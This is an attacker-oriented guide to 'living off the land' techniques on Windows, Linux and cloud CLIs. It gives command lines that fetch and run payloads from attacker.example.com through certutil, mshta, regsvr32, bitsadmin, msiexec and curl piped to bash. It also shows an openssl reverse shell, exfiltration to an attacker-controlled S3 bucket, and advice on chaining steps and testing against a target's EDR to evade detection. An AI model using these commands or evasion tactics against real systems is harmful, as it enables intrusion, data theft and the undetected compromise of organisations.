# Living off the land

Living off the land (LoLbins) means using tools already present on the target system
to carry out malicious actions. No payload to drop, no binary to sign, no new process
to explain: everything runs under the cover of a tool the organisation trusts.

## Why it works

Antivirus and EDR products build their detection around what they know is malicious.
A signed Microsoft binary executing a base64-encoded command is not in the malware
signature database. The alert, if any, comes from the behaviour, and behaviour-based
detection is noisy enough that many legitimate admin workflows trip the same rules.

The LOLBAS project (lolbas-project.github.io) catalogues Windows binaries with
offensive uses. GTFOBins does the same for Linux. The lists are long.

## LoLbins 2.0: the discipline shift

The original LoLbin approach was opportunistic: find a binary that executes arbitrary
code and use it. The current approach is more systematic:

Chain many small, individually unremarkable actions rather than one suspicious one.
Each step uses a legitimate tool for something close to its intended purpose. The
sequence produces the result; no single step is the story.

Mimic real admin workflows. PowerShell remoting, WMI queries, scheduled task creation,
and cloud CLI calls are all things administrators do. The objective is to look like
Dave from IT having a slightly unusual Tuesday, not like an attacker.

Blend into audit logs rather than avoid them. Avoiding logs entirely raises its own
flags. Generating log entries that look routine is more durable.

## High-value LoLbins on Windows

`certutil.exe`: encodes and decodes base64, downloads files from URLs, hashes files.

```text
certutil -urlcache -split -f http://attacker.example.com/payload.b64 payload.b64
certutil -decode payload.b64 payload.exe
```

`mshta.exe`: executes HTA (HTML Application) files, including remote ones.

```text
mshta http://attacker.example.com/payload.hta
mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""cmd /c ...""")
```

`wmic.exe` / `wmic` (deprecated but still present): process creation, remote execution.

```text
wmic process call create "powershell -enc BASE64PAYLOAD"
wmic /node:TARGET process call create "cmd /c whoami"
```

`regsvr32.exe` / `regsvcs.exe` / `regasm.exe`: register COM objects, execute arbitrary
.NET assemblies or remote SCT files.

```text
regsvr32 /s /n /u /i:http://attacker.example.com/payload.sct scrobj.dll
```

`rundll32.exe`: loads and calls DLL exports, including remote ones.

```text
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";...
```

`bitsadmin.exe` / BITS: Background Intelligent Transfer Service downloads and uploads
files with retry and resume, using HTTPS, and persists across reboots.

```text
bitsadmin /transfer job /download /priority foreground \
  http://attacker.example.com/payload.exe C:\payload.exe
```

`msiexec.exe`: installs MSI packages, including remote ones, with no visible window.

```text
msiexec /q /i http://attacker.example.com/payload.msi
```

## Cloud CLIs as LoLbins

AWS CLI, Azure CLI, and the Google Cloud SDK are installed on cloud-connected workstations
and build agents. They authenticate using ambient credentials (instance metadata,
environment variables, credential files) and produce traffic that looks like legitimate
cloud management.

```text
# exfiltrate via S3 (attacker-controlled bucket)
aws s3 cp sensitive_file.txt s3://attacker-bucket/

# pull next-stage payload from storage
az storage blob download --account-name attacker --container payloads \
  --name stage2.ps1 --file stage2.ps1

# enumerate the environment
aws iam get-user
aws ec2 describe-instances --region us-east-1
```

## Linux LoLbins

`curl` / `wget`: download and execute, pipe to shell.

```text
curl -s http://attacker.example.com/payload.sh | bash
```

`python` / `perl` / `ruby`: present on most systems, execute arbitrary code, open
reverse shells.

```text
python3 -c 'import socket,subprocess,os; ...'
perl -e 'use Socket; ...'
```

`openssl`: encode/decode, download over HTTPS, create listeners.

```text
# reverse shell over TLS
openssl s_client -quiet -connect attacker.example.com:443 | /bin/bash 2>&1 | \
  openssl s_client -quiet -connect attacker.example.com:444
```

`awk` / `find` / `tar`: file operations and data staging without dedicated tools.

## Operational approach

The LOLBAS and GTFOBins projects are the starting point for technique selection.
Match the LoLbin to what is actually present on the target: a cloud workstation without
Python is not a candidate for Python-based execution, but will have the cloud CLI.

Test the selected LoLbin against the target's specific EDR before deployment. Many EDR
products now specifically monitor high-value LoLbins (certutil, mshta, regsvr32) and
log or block their network activity. Less-watched alternatives exist in both catalogues.

Chain LoLbin actions to avoid single-step detection: download with BITS, decode with
certutil, execute with rundll32, persist via scheduled task created with schtasks.
Each action individually is low signal; the sequence achieves the objective.
